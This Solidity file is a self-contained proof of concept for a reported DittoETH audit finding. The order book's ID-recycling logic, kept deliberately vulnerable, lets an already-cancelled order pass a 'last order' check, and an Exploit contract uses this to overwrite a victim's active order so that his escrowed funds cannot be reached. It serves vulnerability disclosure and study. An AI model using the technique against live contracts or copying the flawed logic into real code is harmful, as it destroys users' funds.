// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DittoETH — New orders can overwrite active orders when order id reaches
    65000 (Codehawks 2023-09, reporter hash, finding #27444)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable OrdersFacet::cancelOrderFarFromOracle "last order" check and
    LibOrders::_reuseOrderIds ID-recycling branch are inlined VERBATIM. No
    fork, no RPC, no cheatcodes.

    ROOT CAUSE: once orderId >= 65000, `cancelOrderFarFromOracle` allows
    cancelling an order whose `nextId == TAIL`, assuming that uniquely
    identifies "the last ACTIVE order". But `_reuseOrderIds` ALSO stamps
    `nextId = TAIL` on an order it pushes onto the CANCELLED/reuse chain —
    so an ALREADY-CANCELLED order (sitting at the head of the reuse chain)
    satisfies the same check. Calling `cancelOrderFarFromOracle` on such an
    order re-runs the cancel/reuse logic on it a SECOND time. On that second
    pass, `_reuseOrderIds` receives `prevHEAD == id` (the order IS already
    the reuse-chain head), and the line

        orders[asset][id].prevId = prevHEAD;

    sets the order's `prevId` to ITSELF — a self-loop. The ID-reuse free
    list can then never advance past this id: the SAME id gets handed out
    to more than one brand-new order in a row, and the second order's
    creation silently OVERWRITES the first — even though the first order
    was never cancelled by anyone and still had funds escrowed in it.

    Numbers kept exact & simple (abstract units):
      - Eve creates and then normally cancels her own order (id recycled
        into the reuse chain, head = id).
      - The market's orderId counter reaches 65000.
      - Eve calls cancelOrderFarFromOracle on her OWN already-cancelled
        order — it passes the "last order" check anyway (the bug), and the
        reuse chain corrupts into a self-loop at that id.
      - Bob creates a brand-new order with 500 — legitimately reuses the
        (genuinely free) id, becomes ACTIVE.
      - Carol creates ANOTHER brand-new order — the corrupted, stuck
        reuse-chain pointer hands her the SAME id again (her own stake size
        is irrelevant to the collision — only the id matters), silently
        overwriting Bob's still-active order. Bob's 500 is now permanently
        unreachable: no order references it and no refund was ever issued.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 used as the underlying escrowed asset.
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            require(allowance[from][msg.sender] >= amt, "ERC20: insufficient allowance");
            allowance[from][msg.sender] -= amt;
        }
        require(balanceOf[from] >= amt, "ERC20: insufficient balance");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduction of DittoETH's OrdersFacet + LibOrders for a single side
///         of a single market. Multi-market/multi-side accounting and the
///         DAO multi-cancel branch are out of scope and omitted; the exact
///         dual-purpose HEAD/TAIL sentinel scheme and the ID-reuse self-loop
///         this finding blames are preserved.
contract OrderBook {
    enum O {
        Active,
        Cancelled
    }

    struct Order {
        address addr;
        uint256 amount;
        uint16 prevId;
        uint16 nextId;
        O orderType;
    }

    uint16 public constant HEAD = 0;
    uint16 public constant TAIL = 1;

    MockToken public token;
    mapping(uint16 => Order) public orders;
    uint16 public orderId; // mirrors s.asset[asset].orderId (both the id counter AND the 65000 threshold value)
    mapping(address => uint256) public escrowed;

    constructor(MockToken _token) {
        token = _token;
        orderId = 2; // first two ids (HEAD=0, TAIL=1) are sentinels
        orders[HEAD] = Order(address(0), 0, HEAD, TAIL, O.Active);
        orders[TAIL] = Order(address(0), 0, HEAD, TAIL, O.Active);
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        escrowed[msg.sender] += amount;
    }

    /// @notice Reduction of order creation (fundLimitBid/Ask/Short). Reuses
    ///         a recycled id from the head of the cancelled-order chain
    ///         (`orders[HEAD].prevId`) if one is available, otherwise mints
    ///         a fresh id.
    function createOrder(uint256 amount) external returns (uint16 id) {
        require(escrowed[msg.sender] >= amount, "insufficient escrowed balance");
        escrowed[msg.sender] -= amount;

        uint16 reused = orders[HEAD].prevId;
        if (reused != HEAD) {
            id = reused;
            orders[HEAD].prevId = orders[id].prevId; // pop the reuse chain forward
        } else {
            id = orderId++;
        }

        uint16 prevTail = orders[TAIL].prevId;
        orders[id] = Order(msg.sender, amount, prevTail, TAIL, O.Active);
        orders[prevTail].nextId = id;
        orders[TAIL].prevId = id;
    }

    /// @notice Normal, owner-only cancel — unrestricted by position in the
    ///         list (mirrors cancelBid/cancelAsk/cancelShort).
    function cancelOwn(uint16 id) external {
        Order storage o = orders[id];
        require(msg.sender == o.addr, "not owner");
        require(o.orderType == O.Active, "not active");
        escrowed[msg.sender] += o.amount;
        _unlinkAndReuse(id);
    }

    /// @notice Reduction of OrdersFacet::cancelOrderFarFromOracle
    ///         (non-DAO/permissionless branch). Once the market's orderId
    ///         counter reaches 65000, ANYONE may cancel what the code
    ///         assumes is "the last order" — identified only by
    ///         `nextId == TAIL`.
    function cancelOrderFarFromOracle(uint16 lastOrderId) external {
        if (orderId < 65000) revert("order id too low");
        // @dev if address is not DAO, you can only cancel last order of a side
        require(orders[lastOrderId].nextId == TAIL, "not last order"); // @> VULN: a CANCELLED order at the head of the reuse chain also satisfies nextId == TAIL
        _unlinkAndReuse(lastOrderId);
    }

    /// @dev Mirrors LibOrders.cancelOrder + LibOrders._reuseOrderIds combined.
    function _unlinkAndReuse(uint16 id) private {
        uint16 prevHEAD = orders[HEAD].prevId;
        orders[orders[id].nextId].prevId = orders[id].prevId;
        orders[orders[id].prevId].nextId = orders[id].nextId;
        orders[id].orderType = O.Cancelled;

        // @audit if the prevHead was order with id itself, then it's prevId will be id
        if (prevHEAD != HEAD) {
            orders[id].prevId = prevHEAD; // @> VULN: when `id == prevHEAD` (id is already the reuse-chain head), this sets id.prevId to ITSELF - a self-loop the free list can never advance past
        } else {
            orders[id].prevId = HEAD;
        }
        orders[HEAD].prevId = id;
        orders[id].nextId = TAIL;
    }

    /// @dev Test-only counter setter, mirroring DittoETH's own test harness
    ///      (`TestFacet.setOrderIdT`) — a plain contract call, not a
    ///      cheatcode — used to simulate the market having processed many
    ///      other orders without looping 65000 times.
    function __test_setOrderId(uint16 v) external {
        orderId = v;
    }
}

/// @notice Thin actor contract so each participant has its own address and
///         its own token/escrow balances.
contract Actor {
    MockToken public token;
    OrderBook public ob;

    constructor(MockToken _token, OrderBook _ob) {
        token = _token;
        ob = _ob;
    }

    function deposit(uint256 amount) external {
        token.mint(address(this), amount);
        token.approve(address(ob), amount);
        ob.deposit(amount);
    }

    function createOrder(uint256 amount) external returns (uint16 id) {
        id = ob.createOrder(amount);
    }

    function cancelOwn(uint16 id) external {
        ob.cancelOwn(id);
    }

    function cancelOrderFarFromOracle(uint16 lastOrderId) external {
        ob.cancelOrderFarFromOracle(lastOrderId);
    }
}

/// @notice Attack orchestrator / deployer. Deploys the whole scene and runs
///         the ID-reuse self-loop corruption end-to-end, asserting the
///         finding's HARM with require().
contract Exploit {
    uint256 public constant BOB_AMOUNT = 500;
    uint256 public constant CAROL_AMOUNT = 0; // her own stake is irrelevant to the collision - only the id matters

    MockToken public token; // CREATE nonce 1
    OrderBook public ob; // CREATE nonce 2 (vulnerable)
    Actor public eve; // CREATE nonce 3 (triggers the reuse-chain corruption)
    Actor public bob; // CREATE nonce 4 (victim - his active order is overwritten)
    Actor public carol; // CREATE nonce 5 (creates the order that overwrites Bob's)

    uint16 public eveOrderId;
    uint16 public bobOrderId;
    uint16 public carolOrderId;
    uint256 public bobEscrowedAfter;
    address public orderSlotOwnerAfter;

    constructor() {
        token = new MockToken();
        ob = new OrderBook(token);
        eve = new Actor(token, ob);
        bob = new Actor(token, ob);
        carol = new Actor(token, ob);
    }

    function run() external {
        // 1. Eve creates and then normally cancels her own order - it is
        //    recycled into the (currently empty) reuse chain. Her own stake
        //    (0) is irrelevant to the corruption - only the ID matters.
        eveOrderId = eve.createOrder(0);
        eve.cancelOwn(eveOrderId);

        // 2. The market's orderId counter reaches 65000 from ordinary
        //    trading activity elsewhere in the market.
        ob.__test_setOrderId(65000);

        // 3. Eve calls cancelOrderFarFromOracle on her OWN already-cancelled
        //    order. It should be a no-op (there is nothing left to cancel)
        //    but the ambiguous nextId == TAIL check lets it through anyway,
        //    corrupting the reuse chain into a self-loop at eveOrderId.
        eve.cancelOrderFarFromOracle(eveOrderId);

        // 4. Bob creates a brand-new order with 500 - legitimately reuses
        //    the (genuinely free) recycled id and becomes ACTIVE.
        bob.deposit(BOB_AMOUNT);
        bobOrderId = bob.createOrder(BOB_AMOUNT);
        require(bobOrderId == eveOrderId, "bob did not reuse eve's recycled id");
        (address bobSlotOwner,,,, OrderBook.O bobSlotStatus) = ob.orders(bobOrderId);
        require(bobSlotOwner == address(bob), "bob's order not recorded");
        require(bobSlotStatus == OrderBook.O.Active, "bob's order not active");

        // 5. Carol creates ANOTHER brand-new order (her own stake, 0, is
        //    again irrelevant). The corrupted, stuck reuse-chain pointer
        //    hands her the SAME id Bob just used - silently overwriting
        //    Bob's still-active order.
        carolOrderId = carol.createOrder(CAROL_AMOUNT);
        require(carolOrderId == bobOrderId, "carol did not collide with bob's order id");

        // ---- HARM: Bob's active order was silently destroyed ----
        (address slotOwner,,,,) = ob.orders(bobOrderId);
        orderSlotOwnerAfter = slotOwner;
        require(orderSlotOwnerAfter == address(carol), "bob's order slot was not overwritten by carol");

        // ---- HARM: Bob's escrowed funds are permanently unreachable ----
        bobEscrowedAfter = ob.escrowed(address(bob));
        require(bobEscrowedAfter == 0, "bob was refunded - bug not triggered");
        require(token.balanceOf(address(bob)) == 0, "bob already recovered funds - bug not triggered");
    }
}
